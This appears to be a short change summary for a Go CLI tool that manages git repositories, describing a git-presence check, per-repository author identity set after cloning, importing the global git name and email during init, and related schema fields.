- `PersistentPreRunE` on `rootCmd` in `main.go`: calls `exec.LookPath("git")` before any command runs; returns a clear error if git is not found.
- `NewManagerWithCredentials()` in `manager.go`: new constructor accepting `*types.CredentialConfig`. After a successful clone, runs `git -C <repoPath> config user.name/user.email` using the effective identity: `repo.User`/`repo.Email` override, falling back to `global.credentials.gitUserName`/`gitUserEmail`. Never touches `--global` config.
- `RunInit()` in `setup.go`: silently reads `git config --global user.name/email` and writes them to the generated config's `credentials.gitUserName`/`gitUserEmail` fields if present.
- Schema and type changes: `Repository` gains `user`/`email` fields; `CredentialConfig` gains `gitUserName`/`gitUserEmail` fields.
